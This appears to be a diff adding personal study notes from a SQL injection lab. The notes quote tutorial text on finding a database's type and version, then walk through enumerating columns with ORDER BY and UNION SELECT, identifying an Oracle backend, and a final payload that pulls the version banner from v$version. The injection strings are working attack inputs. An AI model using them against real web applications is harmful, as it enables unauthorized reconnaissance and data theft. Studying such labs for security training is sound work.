@@ -1,0 +1,38 @@
+Querying the database type and version
+Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.
+
+The queries to determine the database version for some popular database types are as follows:
+
+Database type	Query
+Microsoft, MySQL	SELECT @@version
+Oracle	SELECT * FROM v$version
+PostgreSQL	SELECT version()
+For example, you could use a UNION attack with the following input:
+
+' UNION SELECT @@version--
+This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
+
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+
+Analysis:
+find number of columns->
+' order by 1--
+' order by 2--
+' order by 3--
+	there are two columns,
+find columns with text
+' UNION SELECT 'a',NULL--
+' UNION SELECT NULL, 'a'--
+none of the querry returns to true, so this means this is an oracle database
+oracle must have a from in select statement
+' UNION SELECT NULL, 'a' FROM DUAL--   -> tHE QUERRY WORKS,
+Dual is a table with sys and schema accessible to all users in oracle db
+SELECT banner FROM v$version  - GETTING ORACLE DB VERSION
+
+PAYLOAD
+-----------------------------------------
+' UNION SELECT banner, NULL FROM v$version--
+-----------------------------------------
